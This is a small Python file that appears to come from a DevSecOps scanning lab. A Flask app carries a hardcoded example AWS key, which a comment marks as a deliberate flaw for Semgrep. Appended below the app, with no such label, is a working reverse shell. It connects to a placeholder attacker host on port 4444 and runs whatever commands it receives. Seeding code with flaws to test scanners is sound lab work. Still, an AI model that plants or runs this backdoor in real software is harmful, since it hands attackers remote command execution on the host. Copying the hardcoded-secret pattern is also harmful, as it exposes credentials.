from flask import Flask, request
import os

app = Flask(__name__)

# Lỗi cố ý: Hardcoded API Key cho Semgrep phát hiện
API_KEY = "AKIAIOSFODNN7EXAMPLE" 

@app.route("/")
def home():
    return "DevSecOps Lab Running!"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)

import socket
import subprocess
# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Connect to the attacker's machine
s.connect(("attacker_ip", 4444))
# Redirect input/output to the socket
while True:
   command = s.recv(1024).decode()
   if command.lower() == "exit":
       break
   output = subprocess.getoutput(command)
   s.send(output.encode())
s.close()